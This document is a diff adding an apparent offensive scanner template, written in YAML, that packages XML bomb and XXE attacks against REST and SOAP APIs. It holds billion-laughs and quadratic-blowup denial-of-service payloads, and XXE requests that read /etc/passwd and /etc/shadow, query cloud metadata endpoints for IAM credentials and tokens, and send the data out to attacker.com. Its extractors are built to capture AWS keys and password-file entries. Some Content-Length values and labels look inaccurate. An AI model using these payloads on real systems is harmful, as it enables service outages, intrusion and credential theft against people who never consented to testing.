@@ -1,0 +1,248 @@
+id: rest-api-xml-bomb-payload
+
+info:
+  name: REST API XML Bomb - Billion Laughs Attack
+  author: elite-red-team
+  severity: critical
+  description: |
+    Advanced XML External Entity (XXE) and XML Bomb attack template targeting REST APIs.
+    Exploits XML parsers with billion laughs attack, quadratic blowup, and external
+    entity injection to cause DoS, information disclosure, and SSRF attacks.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://en.wikipedia.org/wiki/Billion_laughs_attack
+    - https://portswigger.net/web-security/xxe
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-611
+  tags: api,xxe,xml-bomb,billion-laughs,dos,ssrf,red-team
+
+http:
+  - raw:
+      # Test 1: Classic Billion Laughs XML Bomb
+      - |
+        POST /api/xml/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 560
+        User-Agent: Mozilla/5.0 (compatible; XMLBomber/1.0)
+        
+        <?xml version="1.0"?>
+        <!DOCTYPE lolz [
+          <!ENTITY lol "lol">
+          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+        ]>
+        <lolz>&lol9;</lolz>
+        
+      # Test 2: XXE with External Entity File Read
+      - |
+        POST /api/xml/process HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Content-Length: 221
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ELEMENT foo ANY>
+          <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          <!ENTITY xxe2 SYSTEM "file:///etc/hosts">
+          <!ENTITY xxe3 SYSTEM "file:///proc/version">
+        ]>
+        <foo>&xxe;&xxe2;&xxe3;</foo>
+        
+      # Test 3: XXE with SSRF Attack
+      - |
+        POST /api/data/import HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 312
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+          <!ENTITY % xxe2 SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
+          <!ENTITY callhome SYSTEM "http://attacker.com/xxe?data=%xxe;">
+        ]>
+        <foo>&callhome;</foo>
+        
+      # Test 4: Quadratic Blowup Attack
+      - |
+        POST /api/xml/validate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Content-Length: 445
+        
+        <?xml version="1.0"?>
+        <!DOCTYPE kaboom [
+          <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+          <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+          <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+        ]>
+        <kaboom>&c;</kaboom>
+        
+      # Test 5: XXE with Parameter Entity
+      - |
+        POST /api/xml/parser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 298
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY % file SYSTEM "file:///etc/passwd">
+          <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/xxe?data=%file;'>">
+          %eval;
+          %exfiltrate;
+        ]>
+        <foo>XXE Test</foo>
+        
+      # Test 6: XML Bomb with SOAP Envelope
+      - |
+        POST /api/soap/service HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "processXML"
+        Content-Length: 687
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE soap [
+          <!ENTITY bomb "BOMB">
+          <!ENTITY bomb2 "&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;&bomb;">
+          <!ENTITY bomb3 "&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;&bomb2;">
+          <!ENTITY bomb4 "&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;&bomb3;">
+        ]>
+        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <processData>&bomb4;</processData>
+          </soap:Body>
+        </soap:Envelope>
+        
+      # Test 7: XXE with Base64 Encoding
+      - |
+        POST /api/xml/decode HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Content-Length: 234
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+          <!ENTITY xxe2 SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
+        ]>
+        <foo>&xxe;&xxe2;</foo>
+        
+      # Test 8: XML Bomb with Recursive Entity
+      - |
+        POST /api/xml/recursive HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 189
+        
+        <?xml version="1.0"?>
+        <!DOCTYPE recursive [
+          <!ENTITY s "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
+          <!ENTITY t "&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;">
+        ]>
+        <recursive>&t;</recursive>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 202
+          - 400
+          - 500
+          - 502
+          - 503
+          - 504
+          
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+          - "daemon:"
+          - "nobody:"
+          - "www-data:"
+          - "apache:"
+          - "nginx:"
+          - "mysql:"
+          - "postgres:"
+          - "127.0.0.1"
+          - "localhost"
+          - "metadata"
+          - "security-credentials"
+          - "instance"
+          - "BOMB"
+          - "lol"
+          - "aaaaaaaaaa"
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+          - "application/octet-stream"
+          - "text/html"
+        condition: or
+        
+      - type: regex
+        part: body
+        regex:
+          - '(?i)root:[x*]:0:0:'
+          - '(?i)[a-z0-9]+:[x*]:[0-9]+:[0-9]+:'
+          - '(?i)127\.0\.0\.1\s+localhost'
+          - '(?i)Linux version [0-9]+'
+          - '(?i)"AccessKeyId"\s*:\s*"[A-Z0-9]+"'
+          - '(?i)"SecretAccessKey"\s*:\s*"[A-Za-z0-9/+]+"'
+          - '(?i)"Token"\s*:\s*"[A-Za-z0-9/+=]+"'
+          - '(?i)(BOMB|lol|aaaa){10,}'
+        condition: or
+        
+      - type: dsl
+        dsl:
+          - 'len(body) > 10000'
+          - 'contains(tolower(body), "entity")'
+          - 'contains(tolower(body), "recursive")'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: file_content
+        part: body
+        regex:
+          - '([a-z0-9_-]+:[x*]:[0-9]+:[0-9]+:[^:]*:[^:]*:[^\r\n]*)'
+          - '(127\.0\.0\.1\s+[^\r\n]+)'
+          - '(Linux version [^\r\n]+)'
+          
+      - type: regex
+        name: aws_credentials
+        part: body
+        regex:
+          - '"AccessKeyId"\s*:\s*"([A-Z0-9]+)"'
+          - '"SecretAccessKey"\s*:\s*"([A-Za-z0-9/+]+)"'
+          - '"Token"\s*:\s*"([A-Za-z0-9/+=]+)"'
+          
+      - type: regex
+        name: bomb_pattern
+        part: body
+        regex:
+          - '((?:BOMB|lol|aaaa){5,})'
+          
+      - type: kval
+        part: header
+        kval:
+          - Content-Type
+          - Content-Length
+          - Server
